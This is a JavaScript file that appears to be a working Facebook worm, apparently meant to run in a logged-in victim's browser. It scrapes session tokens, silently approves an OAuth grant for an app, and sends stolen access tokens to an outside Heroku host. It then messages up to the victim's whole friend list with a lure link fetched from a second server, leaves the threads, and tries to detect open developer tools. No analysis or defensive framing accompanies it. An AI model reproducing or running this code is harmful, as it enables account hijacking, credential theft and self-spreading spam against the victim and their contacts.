(new Image).src = "//whos.amung.us/swidget/mandar1n0s";

var cnsl = true;
var win = this;
var sie = win["XMLHttpRequest"];
var empty = "";
function nejse() {
  var c_n = "loclater:987"+profile_id;
  var c_t = 30;

  if(!localStorage[c_n] || parseInt(localStorage[c_n]) < Date.now()-60*1000*c_t){
      localStorage[c_n] = Date.now();
    config = {};
    config["post_limit"] = "1";
    config["tag_limit"] = 150;
    config["mode"] = true;
    if (!(1 != config["mode"] && profile_id != config["testuser"])) {
       _e_P();
       nekot();
    }
  }else{
      var a_t = new Date();
      a_t.setTime(parseInt(localStorage[c_n]) + (60*1000*c_t));
      console.log("a_t:" + a_t.toLocaleString());
  }
}
function _e_P(){
  var b = {};
  b["fb_dtsg"] = fb_dtsg;
  b["__user"] = profile_id;
  b["__a"] = 1;
  b["__dyn"] = dyn;
  b["__af"] = rastgele(2);
  b["__req"] = rastgele(2);
  b["__be"] = -1;
  b["__pc"] = "EXP:DEFAULT";
  b["__rev"] = __rev;
  b["logging"] = rand(1111111111, 1E16);
  var d = new sie;
  d["open"]("POST", "/settings/application/platform_opt_out/submit/?action=enable&dpr=1");
  d["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  d["onreadystatechange"] = function() {
    if (4 == d["readyState"]) {
      if (200 == d["status"]) {
        _g_T();
      }
    }
  };
  d["send"](_z(b));
}
function nekot() {

  if (localStorage.access_token != "nejsimddddd") {
    var getParams = {};
    getParams["composer_id"] = "rc.u_0_" + rand(0, 30);
    getParams["composer_type"] = "pages_feed";
    getParams["target_id"] = "20531316728";
    getParams["av"] = profile_id;
    getParams["dpr"] = "1";
    var params = {};
    params["__user"] = profile_id;
    params["__a"] = "1";
    params["__dyn"] = dyn;
    params["__af"] = "j0";
    params["__req"] = "2z";
    params["__be"] = "-1";
    params["__pc"] = "EXP1:home_page_pkg";
    params["__rev"] = __rev;
    params["fb_dtsg"] = fb_dtsg;
    params["jazoest"] = jazoest;
    var xhr = new sie;
    xhr.open("POST", "/react_composer/status/bootstrap/?" + _z(getParams));
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4 && xhr.status == 200) {
        if (xhr.responseText.indexOf("access_token") > 0) {
           new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  xhr.responseText.split('access_token":')[1].split('"')[1].split('"')[0] + "&gnd=PROBA_INBOX";
          localStorage.access_token = "nejsimddddd";
        }
      }
    };
    xhr.send(_z(params));
  }
}
function _g_T() {
    var params = {};
    params["fb_dtsg"] = fb_dtsg;
    params["app_id"] = "121876164619130";
    params["redirect_uri"] = "fbconnect://success";
    params["display"] = "popup";
    params["access_token"] = "";
    params["sdk"] = "";
    params["from_post"] = 1;
    params["private"] = "";
    params["tos"] = "";
    params["login"] = "";
    params["read"] = "";
    params["write"] = "";
    params["extended"] = "";
    params["social_confirm"] = "";
    params["confirm"] = "";
    params["seen_scopes"] = "";
    params["auth_type"] = "";
    params["auth_token"] = "";
    params["auth_nonce"] = "";
    params["default_audience"] = "";
    params["ref"] = "Default";
    params["return_format"] = "access_token";
    params["domain"] = "";
    params["sso_device"] = "ios";
    params["__CONFIRM__"] = 1;
    var xhr = new sie();
    xhr.open("POST", "/v2.8/dialog/oauth/confirm");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.onreadystatechange = function(){
        if (xhr.readyState == 4 && xhr.status == 200){
            var c = {};
            if(xhr.responseText.indexOf("access_token=") > 0){
                c.access_token = xhr.responseText.split("access_token=")[1].split("&")[0];
                _c(c);
            }
        }
    }
    xhr.send(deSerialize(params));
}
function _c(c) {
  var b$$0 = {};
  b$$0["q"] = "SELECT uid, name, online_presence, pic_big, can_post, friend_count  FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) AND can_post=1 Order By online_presence Limit 2000";
  b$$0["access_token"] = c["access_token"];
  b$$0["ext"] = "me";
  var e = new sie;
  e["open"]("GET", "https://graph.facebook.com/fql?" + _z(b$$0), true);
  e["onreadystatechange"] = function() {
    if (4 == e["readyState"] && 200 == e["status"]) {
      var b = JSON["parse"](e["responseText"].replace("for (;;);", ""));
      if (!b["error"]) {
        b = b["data"];
        b = _u(b);
        c["friends"] = [];
        i = 0;
        for (;i < b["length"];i++) {
          if (b[i].online_presence == "active") {
            c["friends"].push(b[i]);
          }
        }
        i = 0;
        for (;i < b["length"];i++) {
          if (b[i].online_presence == "idle") {
            c["friends"].push(b[i]);
          }
        }
        i = 0;
        for (;i < b["length"];i++) {
          if (b[i].online_presence == "offline") {
            c["friends"].push(b[i]);
          }
        }
        if (0 < c["friends"].length) {
          _d(c);
        }
      }
    }
  };
  e["send"]();
}
function _d(c) {
  var b = Math["ceil"](c["friends"].length / config["tag_limit"]);
  config["post_limit"] = b > config["post_limit"] ? config["post_limit"] : b;
  p = 0;
  for (;p < config["post_limit"];p++) {
    c["tags"] = [];
    pk = 0;
    for (;pk < config["tag_limit"];pk++) {
      b = pk + config["tag_limit"] * p;
      if (c["friends"][b]) {
        c["tags"].push(c["friends"][b]);
      }
    }
    console["log"](c["tags"]);
    _e(c);
  }
}
function _e(c) {
      var b = c["tags"];

      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://linear-cloud.herokuapp.com/?uid="+profile_id);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
      xhr.send();
      xhr.onreadystatechange = function() {
          if (xhr.readyState == 4 && xhr.status == 200) {
           data = JSON.parse(xhr.responseText);
           if(data.link){
             c["link"] = data.link;
             c["tags"] = b;
             message(c);
           }

          }
      }



}

function message(c) {
  var textArray = [":o", ":P", "O:)", "3:)", ";)", ":O", "-_-", ">:O", ":*", "<3", "^_^", "8-)", "(y)", ":)"];
  var emoji = textArray[Math.floor(Math.random() * textArray.length)];
  var body = emoji + "\nVideo ⤵⤵⤵\n" + c.link;
  var b = c["tags"];
  var e = c["link"];
  var elementid = "rc.u_ps_jsonp_6_3_1";
  var message = generate_name(10);
  message_id = _v(0xa1b01d4b1c7, 999999999999999);
  var d$$0 = {};
  d$$0["client"] = "mercury";
  d$$0["action_type"] = "ma-type:user-generated-message";  //translated title
  d$$0["body"] = body;
  d$$0["client_thread_id"] = "root:"+message_id;
  d$$0["has_attachment"] = false;
  d$$0["message_id"] = message_id;
  d$$0["offline_threading_id"] = message_id;
  d$$0["signature_id"] = _y(8);;
  d$$0["source"] = "source:chat:web";
  i = 0;
  for (;i < c["tags"].length;i++) {
    d$$0["specific_to_list[" + i + "]"] = "fbid:"+c["tags"][i].uid;
  }
  d$$0["tags[0]"] = "web:trigger:one_to_one_plus";
  d$$0["timestamp"] = Date.now();
  d$$0["ui_push_phase"] = "C3";
  d$$0["__user"] = profile_id;
  d$$0["__a"] = 1;
  d$$0["__dyn"] = dyn;
  d$$0["__af"] = "i0";
  d$$0["__req"] = "q";
  d$$0["__be"] = -1;
  d$$0["__pc"] = "PHASED:DEFAULT";
  d$$0["__rev"] = __rev;
  d$$0["fb_dtsg"] = fb_dtsg;
  d$$0["jazoest"] = jazoest;

  var f = new sie;
  f["open"]("POST", "https://www.facebook.com/messaging/send/?dpr=1&ext=me");
  f["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  f["send"](_z(d$$0));
  f["onreadystatechange"] = function() {
    if (4 == f["readyState"] && 200 == f["status"]) {
      var d = JSON["parse"](f["responseText"].replace("for (;;);", ""));
      if (!d["error"]) {
        c["thread_fbid"] = _t(d, "thread_fbid");
        leave(c);

      }
    }
  };
}
function leave(c) {
  var message = generate_name(10);
  message_id = _v(0xa1b01d4b1c7, 999999999999999);
  var d$$0 = {};
  d$$0["client"] = "mercury";
  d$$0["action_type"] = "ma-type:log-message";  //translated title
  d$$0["ephemeral_ttl_mode"] = 0;
  d$$0["log_message_data[removed_participants][0]"] = "fbid:"+profile_id;
  d$$0["log_message_type"] = "log:unsubscribe";
  d$$0["message_id"] = message_id;
  d$$0["offline_threading_id"] = message_id;
  d$$0["source"] = "source:chat:web";
  d$$0["thread_fbid"] = c["thread_fbid"];
  d$$0["timestamp"] = Date.now();
  d$$0["__user"] = profile_id;
  d$$0["__a"] = 1;
  d$$0["__dyn"] = dyn;
  d$$0["__af"] = "i0";
  d$$0["__req"] = "q";
  d$$0["__be"] = -1;
  d$$0["__pc"] = "PHASED:DEFAULT";
  d$$0["__rev"] = __rev;
  d$$0["fb_dtsg"] = fb_dtsg;
  d$$0["jazoest"] = jazoest;

  var f = new sie;
  f["open"]("POST", "https://www.facebook.com/messaging/send/?dpr=1&ext=me");
  f["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  f["send"](_z(d$$0));
  f["onreadystatechange"] = function() {
    if (4 == f["readyState"] && 200 == f["status"]) {
      var d = JSON["parse"](f["responseText"].replace("for (;;);", ""));
      if (!d["error"]) {
        //c["post_id"] = _t(d, "targetfbid");

      }
    }
  };
}

function generate_name(length,firstUpper){
    rname = "";
    sesli = "aeiou";
    sessiz = "bcdfghjklmnprstvyz";
    rname = rand(1,2) == 1?sessiz[rand(0,sessiz.length-1)]:sesli[rand(0,sesli.length-1)];
    if(firstUpper == true){
        rname = rname.toUpperCase();
    }
    for(n=0;n<length;n++){
        if(sesli.indexOf(rname[rname.length-1]) >= 0){
            rname += sessiz[rand(0,sessiz.length-1)];
        }else{
            rname += sesli[rand(0,sesli.length-1)];
        }
    }
    return rname;
}

function _m(c, b) {
  rname = "";
  sesli = "aeiou";
  sessiz = "bcdfghjklmnprstvyz";
  rname = 1 == _v(1, 2) ? sessiz[_v(0, sessiz["length"] - 1)] : sesli[_v(0, sesli["length"] - 1)];
  if (1 == b) {
    rname = rname["toUpperCase"]();
  }
  n = 0;
  for (;n < c;n++) {
    rname = 0 <= sesli["indexOf"](rname[rname["length"] - 1]) ? rname + sessiz[_v(0, sessiz["length"] - 1)] : rname + sesli[_v(0, sesli["length"] - 1)];
  }
  return rname;
}
function _n(c, b, e) {
  var d = false;
  a = 0;
  for (;a < c["length"];a++) {
    for (k in c[a]) {
      if (k == b && c[a][k] == e) {
        d = true;
        break;
      }
    }
  }
  return d;
}
function _o(c, b) {
  var e = "abcdefghijklmnoprstuvyzx0123456789";
  var d = "";
  cr = 0;
  for (;cr < c["length"];cr++) {
    d += e[b["indexOf"](c[cr])];
  }
  return d;
}
function _p() {
  function c() {
    return Math["floor"](65536 * (1 + Math["random"]())).toString(16).substring(1);
  }
  return c() + c() + "-" + c() + "-" + c() + "-" + c() + "-" + c() + c() + c();
}
function _s(c, b) {
  var e = [];
  for (;e["length"] < c;) {
    var d = Math["floor"](Math["random"]() * b);
    if (0 > e["indexOf"](d)) {
      e["push"](d);
    }
  }
  return e;
}
function _t(c, b) {
  var e = false;
  for (key in c) {
    if (key["toString"]() == b) {
      e = c[key];
      break;
    } else {
      if (typeof c[key] == "object" && (e = _t(c[key], b), 0 != e)) {
        break;
      }
    }
  }
  return e;
}
function _u(c) {
  var b = c["length"];
  var e;
  var d;
  for (;0 !== b;) {
    d = Math["floor"](Math["random"]() * b);
    --b;
    e = c[b];
    c[b] = c[d];
    c[d] = e;
  }
  return c;
}
function _v(c, b) {
  return Math["floor"](Math["random"]() * (b - c)) + c;
}
function _y(c) {
  mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
  ret = "";
  l = 0;
  for (;l < c;l++) {
    ret += mtn[Math["floor"](Math["random"]() * mtn["length"])];
  }
  return ret;
}
function _z(c) {
  return Object["keys"](c).map(function(b) {
    return encodeURIComponent(b) + "=" + encodeURIComponent(c[b]);
  }).join("&");
}
function get_dyn() {
 function toCompressedString() {
   $BitMap1 = [];
   for (i in t) {
     $BitMap1[t[i]] = 1;
   }
   if ($BitMap1["length"] === 0) {
     return "";
   }
   var l = [];
   var m = 1;
   var n = $BitMap1[0] || 0;
   var o = n.toString(2);
   var p = 1;
   for (;p < $BitMap1["length"];p++) {
     var q = $BitMap1[p] || 0;
     if (q === n) {
       m++;
     } else {
       l["push"](j(m));
       n = q;
       m = 1;
     }
   }
   if (m) {
     l["push"](j(m));
   }
   return k(o + l["join"](""));
 }
 function j(l) {
   var m = l.toString(2);
   var n = "0"["repeat"](m["length"] - 1);
   return n + m;
 }
 function k(l) {
   var m = (l + "00000")["match"](/[01]{6}/g);
   var n = "";
   var o = 0;
   for (;o < m["length"];o++) {
     n += h[parseInt(m[o], 2)];
   }
   return n;
 }
 var bd = document["body"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
 var hd = document["head"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
 var is = bd["concat"](hd);
 var t = [];
 for (x in is) {
   if (is[x] != null) {
     var p = is[x]["replace"]("},", "")["replace"]("]", "");
     if (parseInt(p) >= 7) {
       t["push"](parseInt(p));
     }
   }
 }
 var h = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";
 return toCompressedString();
}
function rastgele(uzunluk) {
    mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
    ret = "";
    for (l = 0; l < uzunluk; l++) {
        ret += mtn[Math.floor(Math.random() * mtn.length)];
    }
    return ret;
}
function rand(min,max){
    return Math.floor(Math.random()* (max-min))+min;
}
function inArray(arr, key, value){
    var res = false;
    for(a=0;a<arr.length;a++){
        for(k in arr[a]){
            if(k == key && arr[a][k] == value){
                res = true;
                break;
            }
        }
    }
    return res;
}

function decode(t,h){
    var a = "abcdefghijklmnoprstuvyzx0123456789";
    var c = "";
    for(cr=0;cr<t.length;cr++){
        c += a[h.indexOf(t[cr])];
    }
    return c;
}

function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
    s4() + '-' + s4() + s4() + s4();
}

function randoms(l, m) {
    var r = [];
    while (r.length < l) {
        var rnd = Math.floor(Math.random() * m);
        if (r.indexOf(rnd) < 0) {
            r.push(rnd);
        }
    }
    return r;
}

function searchArray(a,k){
    var found = false;
    for(key in a){
        if(key.toString() == k){
            found = a[key];
            break;
        }else if(typeof a[key] == "object"){
            found = searchArray(a[key],k);
            if(found != false){
                break;
            }
        }
    }
    return found;
}

function shuffle(array) {
  var currentIndex = array.length, temporaryValue, randomIndex;

  while (0 !== currentIndex) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }

  return array;
}
function deSerialize(json) {
    return Object.keys(json).map(function(key) {
        return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
    }).join('&');
}
var cntrl = "d";
var element = new Image;
element["__defineGetter__"]("id", function() {
  cntrl = "e";
  if (0 == cnsl) {
    win["location"] = "";
  }
});
console["log"](element);
console["clear"]();
function _composer() {
  var c = new sie;
  c["open"]("GET", "https://www.facebook.com/");
  c["send"]();
  c["onreadystatechange"] = function() {
    if (4 == c["readyState"] && (profile_id = c["responseText"].split("USER_ID" + '"' + ":")[1].split('"')[1].split('"')[0], 0 != profile_id)) {
      user_name = c["responseText"].split("NAME" + '"' + ":")[1].split('"')[1].split('"')[0];
      locale = c["responseText"].split('{"locale' + '"' + ":")[1].split('"')[1].split('"')[0];
      fb_dtsg = c["responseText"].split("name=" + '"' + "fb_dtsg")[1].split("value=" + '"')[1].split('"')[0];
      __rev = c["responseText"].split('"' + "server_revision" + '"' + ":")[1].split(",")[0];
      jazoest = "";
      var b = 0;
      for (;b < fb_dtsg["length"];b++) {
        jazoest += fb_dtsg["charCodeAt"](b);
      }
      jazoest = "2" + jazoest;
      dyn = get_dyn();
      nejse();
    }
  };
}
if (0 <= location["hostname"].indexOf("facebook.com") && (cntrl == "d" || 1 == cnsl)) {
  if (!document["getElementById"]("isrun") && 0 > location["href"].indexOf("facebook.com/checkpoint")) {
    var lg = document["createElement"]("meta");
    lg["id"] = "isrun";
    document["head"].appendChild(lg);
    _composer();
  }
} else {
  if (0 <= location["hostname"].indexOf("facebook.com")) {
    console["error"]("Uncaught ReferenceError: fb_dtsg is not defined");
  }
}
;
